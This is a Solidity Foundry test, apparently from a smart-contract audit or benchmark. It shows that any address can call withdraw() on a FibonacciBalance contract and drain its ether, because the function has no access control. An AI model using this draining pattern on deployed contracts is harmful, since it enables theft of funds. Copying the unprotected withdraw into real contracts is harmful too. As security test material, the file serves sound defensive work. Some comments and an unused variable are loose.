
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {FibonacciBalance, FibonacciLib} from "../src/FibonacciBalance.sol";

contract TestAccessControlFibonacciBalance is Test {
    FibonacciBalance public _contractUnderTest;
    FibonacciLib public _fibonacciLib;

    function setUp() public {
        // Deploy the FibonacciLib first
        _fibonacciLib = new FibonacciLib();
        
        // Fund this contract so we can deploy FibonacciBalance with ether
        vm.deal(address(this), 100 ether);
        
        // Deploy FibonacciBalance with initial ether
        _contractUnderTest = new FibonacciBalance{value: 50 ether}(address(_fibonacciLib));
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // The withdraw function has NO access control - there is no owner or privileged role to exclude.
        // This is the vulnerability: ANY address can call withdraw() and drain funds.

        // --- 2. State Configuration ---
        
        // Fund the caller (not strictly necessary for calling withdraw, but good practice)
        vm.deal(caller, 1 ether);
        
        // Record the initial state
        uint256 initialContractBalance = address(_contractUnderTest).balance;
        uint256 initialCallerBalance = caller.balance;
        uint256 initialWithdrawalCounter = _contractUnderTest.withdrawalCounter();

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the unprotected withdraw function
        // This should succeed for ANY caller, demonstrating the vulnerability
        _contractUnderTest.withdraw();

        // Assert that the withdrawal actually happened
        // The withdrawal counter should have incremented
        assertEq(_contractUnderTest.withdrawalCounter(), initialWithdrawalCounter + 1);
        
        // The caller should have received ether (fibonacci(1) = start + 1 = 3 + 1 = 4 ether for first withdrawal)
        // Since start = 3, fibonacci(1) = 4, so 4 ether should be transferred
        uint256 expectedWithdrawal = _contractUnderTest.calculatedFibNumber() * 1 ether;
        
        // Verify the caller received funds
        assertGt(caller.balance, initialCallerBalance);
        
        // Verify the contract balance decreased
        assertLt(address(_contractUnderTest).balance, initialContractBalance);
    }

    receive() external payable {}
}
